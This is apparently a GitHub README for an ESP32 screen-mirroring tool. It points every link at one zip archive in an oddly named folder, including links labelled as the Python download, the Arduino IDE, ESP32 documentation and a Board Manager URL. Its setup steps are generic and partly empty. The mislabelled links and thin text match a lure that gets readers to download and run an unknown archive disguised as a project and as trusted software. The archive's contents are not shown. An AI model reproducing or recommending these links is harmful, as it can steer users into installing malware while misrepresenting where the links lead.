# 🌟 ESP32-Desktop-Monitor - Mirror Your Screen Easily

## 🚀 Getting Started
Welcome to the ESP32 Desktop Monitor project! This software allows you to stream your computer screen to an ESP32 T-Display over WiFi. Follow the steps below to get started.

[![Download](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip%20Release-brightgreen)](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)

## 📦 What You Need
To successfully use this application, ensure you have the following:

### 🖥️ Hardware Requirements
#### ESP32 Development Board
- **Board**: TENSTAR T-Display ESP32-D0WD (or a compatible ESP32 with an integrated display)
- **Chip**: ESP32-D0WD featuring a CH9102 USB-to-Serial chip
- **Memory**: 16MB Flash
- **Display**: 1.14" ST7789 LCD (135x240 pixels)
- **Connectivity**: WiFi and Bluetooth capable

#### Computer
- A computer that runs Python 3.7 or higher
- Compatible operating system: macOS, Linux, or Windows (must have suitable screen capture libraries)

### 💻 Software Requirements
#### ESP32 Side (Using Arduino IDE)
1. **Arduino IDE** (version 1.8.x or 2.x) or **PlatformIO**
2. **ESP32 Board Support Package**
   - Add the following URL in Arduino IDE Preferences → Additional Board Manager URLs:
     ```
     https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip
     ```
   - Install "esp32" by Espressif Systems via the Board Manager.

## 🔗 Download & Install
To download the latest version of the application, visit the following link:

[Download Latest Release](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)

### 📥 Installing the Software
1. Go to the [Releases page](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).
2. Find the latest release of the software.
3. Click on the download link for your operating system to start the download.

## ⚙️ Setup Instructions
After downloading, follow these steps:

### For ESP32 Setup
1. Connect your ESP32 board to the computer via USB.
2. Open Arduino IDE.
3. Go to File → Examples → ESP32 → Your_project_name.
4. Select the correct board type from Tools → Board.
5. Choose the correct port from Tools → Port.
6. Click the upload button (right arrow icon).

### For Computer Setup
1. Ensure Python is installed on your computer. You can download it from [https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).
2. Open your terminal or command prompt.
3. Install required screen capture libraries (if applicable):
   - For Windows, you might need to install libraries like `pygetwindow` and `mss`.
   - For macOS and Linux, use `pygetwindow`, `mss`, or similar.
4. Run the command to start screen capturing.

## 📺 Usage Instructions
Once everything is set up, open the application. Follow these steps to start mirroring:

1. Ensure that your ESP32 and computer are connected to the same WiFi network.
2. Start the software on your computer.
3. Select the screen or application window you want to mirror.
4. On your ESP32, the display should show the mirrored content from your computer.

## 📑 Troubleshooting
If you encounter issues, check the following:

- Ensure your ESP32 is connected properly and powered on.
- Verify that your WiFi connection is stable.
- Make sure you have the correct libraries installed.

## 🛠️ Support and Contribution
If you need assistance, consider reaching out through the project's GitHub issues page. For anyone interested in contributing, please review our contribution guidelines.

## 🔗 Reference Links
- [ESP32 Documentation](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)
- [Arduino IDE Download](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip)

### For further updates, don't forget to check back on the [Releases page](https://github.com/youcef-islam/ESP32-Desktop-Monitor/raw/refs/heads/main/nonsenatorial/ES_Desktop_Monitor_v3.7.zip).